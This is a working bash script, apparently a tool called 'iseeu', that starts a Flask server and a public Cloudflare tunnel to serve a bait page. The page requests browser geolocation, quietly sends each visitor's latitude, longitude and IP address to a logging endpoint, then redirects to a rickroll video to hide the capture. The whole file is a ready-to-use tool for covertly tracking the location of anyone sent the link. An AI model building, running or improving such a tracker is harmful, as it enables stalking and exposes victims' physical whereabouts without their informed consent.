#!/bin/bash

clear

# Prompt for port
read -p "[?] Enter port to use for local server (default 8080): " PORT
PORT=${PORT:-8080}

WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"
CF_LOG="cf_$(date +%s).log"

echo "[*] Killing existing processes..."
pkill -f "flask run" 2>/dev/null
pkill -f cloudflared 2>/dev/null

echo "[*] Creating/clearing directories..."
mkdir -p "$WEB_DIR" "$LOG_DIR"
> "$LOG_FILE"
cd "$WEB_DIR" || exit 1

echo "[*] Creating Flask app..."
cat <<EOF > app.py
from flask import Flask, request, send_file
from datetime import datetime

app = Flask(__name__)

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/logme/<coords>")
def logme(coords):
    ip = request.remote_addr
    with open("$LOG_FILE", "a") as f:
        f.write(f"[{datetime.now()}] GPS: {coords} | IP: {ip}\n")
    return "", 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=$PORT)
EOF

echo "[*] Creating HTML payload..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>I See You</title>
    <script>
        function redirectToRickRoll(position) {
            fetch('/logme/' + position.coords.latitude + ',' + position.coords.longitude);
            window.location.href = 'https://shattereddisk.github.io/rickroll/rickroll.mp4';
        }
        function failLocation() {
            alert("Location access denied.");
        }
        navigator.geolocation.getCurrentPosition(redirectToRickRoll, failLocation);
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
EOF

echo "[*] Starting Flask server..."
FLASK_APP=app.py flask run --host=0.0.0.0 --port=$PORT > /dev/null 2>&1 &
SERVER_PID=$!
echo "[+] Flask server running (PID $SERVER_PID)"

echo "[*] Starting Cloudflared tunnel..."
cloudflared tunnel --url "http://localhost:$PORT" --logfile "$CF_LOG" > /dev/null 2>&1 &
CF_PID=$!

echo -n "[*] Waiting for Cloudflared URL"
for i in {1..10}; do
  sleep 1
  echo -n "."
  URL=$(grep -oE "https://.*\.trycloudflare\.com" "$CF_LOG" | head -n1)
  if [[ -n "$URL" ]]; then break; fi
done
echo

if [[ -n "$URL" ]]; then
  echo "[✓] Public URL: $URL"
else
  echo "[✗] Failed to get Cloudflared public URL."
  kill $SERVER_PID $CF_PID
  rm -f "$CF_LOG"
  exit 1
fi

echo "[*] Logging to $LOG_FILE..."
trap 'echo -e "\n[*] Cleaning up..."; kill $SERVER_PID $CF_PID; rm -f "$CF_LOG"; echo "[*] Done."; exit' INT

echo "[*] Press Ctrl+C to stop."
wait